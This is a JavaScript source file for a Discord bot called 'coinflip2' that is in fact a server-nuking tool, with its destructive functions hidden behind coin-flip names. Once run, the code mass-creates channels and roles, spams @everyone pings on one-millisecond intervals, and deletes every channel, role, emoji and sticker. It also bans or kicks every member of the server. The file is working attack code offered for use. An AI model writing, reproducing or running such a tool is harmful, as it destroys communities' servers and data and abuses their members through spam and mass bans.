/**
 * coinflip2
 * @author Him
 */
const { Client, Intents, MessageEmbed } = require("discord.js");
const coinfilpper = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright, cyan, yellow } = require("chalk");
const { token, prefix, userID, flag } = require("../config/config.json")

coinfilpper.on("ready", () => {
    console.clear();
    coinfilpper.user.setActivity({ name: "Playing with coinflip2", type: "PLAYING" });
});

coinfilpper.on("messageCreate", (message) => {

    // Help Embed
    const help = new MessageEmbed()
        .setDescription(`**coinflip2 ;**
    ${prefix}mc [amount] (text) i.e \`${prefix}mc 5 test\`\n
    ${prefix}cp [amount] (text), {message} i.e \`${prefix}cp 5 test, testing\`\n
    ${prefix}mr [amount] (text) i.e \`${prefix}mr 5 test\`\n
    ${prefix}dc\n
    ${prefix}dr\n
    ${prefix}de\n
    ${prefix}ds\n
    ${prefix}mk\n
    ${prefix}mb
    `)
        .setFooter(`© Him`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    // Perms
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const flipPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const displayPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    // Possible Args
    let args = message.content.split(" ").slice(1);
    var args1 = args[0];
    var args2 = args.slice(1).join(' ')
    var args3 = args.slice(2).join(', ');

    if (!flag) {

        if (message.content.startsWith(prefix + "help")) {
            message.channel.send({embeds: [help]})
        }

        if (message.content.startsWith(prefix + "mc")) {
            ChooseChannel(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dc")) {
            DelAllCoins().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "cp")) {
            ClearNLogs(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mr")) {
            FlipR(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dr")) {
            ClearFlips().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "ds")) {
            DelAllLogs().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "de")) {
            DelCoins().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mb")) {
            FlipB().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mk")) {
            FlipK().catch((err) => {
                message.reply(err);
            });
        }

    } else {

        if (message.content.startsWith(prefix + "help")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            message.channel.send({embeds: [help]})
        }

        if (message.content.startsWith(prefix + "mc")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            ChooseChannel(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dc")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllCoins().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "cp")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            ClearNLogs(args1, args2, args3).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mr")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            FlipR(args1, args2).catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "dr")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            ClearFlips().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "ds")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelAllLogs().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "de")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            DelCoins().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mb")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            FlipB().catch((err) => {
                message.reply(err);
            });
        }

        if (message.content.startsWith(prefix + "mk")) {
            if (message.author.id != userID) return message.reply("You are not authorised to use any of this tools' commands.");
            FlipK().catch((err) => {
                message.reply(err);
            });
        }
    }


    function ChooseChannel(amount, channelName) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the channel");
            if (isNaN(amount)) return reject("Type Error: Use a number");
            if (amount > 500) return reject("Amount Error");
            if (!channelPerms) return reject("Bot Missing Permission: 'MANAGE_CHANNELS'");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                if (!channelName) {
                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" })
                } else {
                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" })
                }
            }
            resolve();
        });
    }


    function ClearNLogs(amount, channelName, pingMessage) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify the amount of logs you wish to clear");
            if (isNaN(amount)) return reject("Type Error: Use a number for the amount");
            if (amount > 500) return reject("Amount Error");
            if (!channelPerms) return reject("Bot Missing Permission: 'MANAGE_CHANNELS'");
            if (!pingMessage) return reject("Unspecified Args: Specify the number of logs you wish to clear");
            for (let i = 0; i < amount; i++) {
                if (message.guild.channels.cache.size === 500) break;
                message.guild.channels.create(channelName || `${message.author.username} was here`, { type: "GUILD_TEXT" })
                    .then((ch) => {
                        setInterval(() => {
                            ch.send("@everyone " + pingMessage);
                        }, 1);
                    });
            }
            resolve();
        });
    }


    function DelAllCoins() {
        return new Promise((resolve, reject) => {
            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
            message.guild.channels.cache.forEach((ch) => ch.delete())
            resolve();
        });
    }


    function FlipR(amount, r) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Unspecified Args: Specify coin");
            if (isNaN(amount)) return reject("Type Error");
            if (!rolePerms) return reject("Bot Error");
            for (let i = 0; i <= amount; i++) {
                if (message.guild.roles.cache.size === 250) break;
                message.guild.roles.create({
                    name: r || "cool",
                    color: "RANDOM",
                    position: i++
                })
            }
            resolve();
        })
    }


    function ClearFlips() {
        return new Promise((resolve, reject) => {
            if (!rolePerms) return reject("Bot Error");
            message.guild.roles.cache.forEach((r) => r.delete())
            resolve();
        });
    }


    function DelCoins() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.emojis.cache.forEach((e) => e.delete())
            resolve();
        });
    }


    function DelAllLogs() {
        return new Promise((resolve, reject) => {
            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
            message.guild.stickers.cache.forEach((s) => s.delete())
            resolve();
        });
    }


    function FlipB() {
        return new Promise((resolve, reject) => {
            if (!flipPerms) return reject("Bot Error");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Flipping...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const member = message.guild.members.cache.get(arrayOfIDs[i]);
                        member.ban()
                    }
                }, 2000);
            })
        })
    }


    function FlipK() {
        return new Promise((resolve, reject) => {
            if (!displayPerms) return reject("Bot Error");
            let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
            message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                setTimeout(() => {
                    msg.edit("Flipping...");
                    for (let i = 0; i < arrayOfIDs.length; i++) {
                        const member = message.guild.members.cache.get(arrayOfIDs[i]);
                        member.kick()
                    }
                }, 2000);
            })
        })
    }
});

try {
    coinfilpper.login(token);
} catch (err) {
    console.error(err)
}
// credits to Him
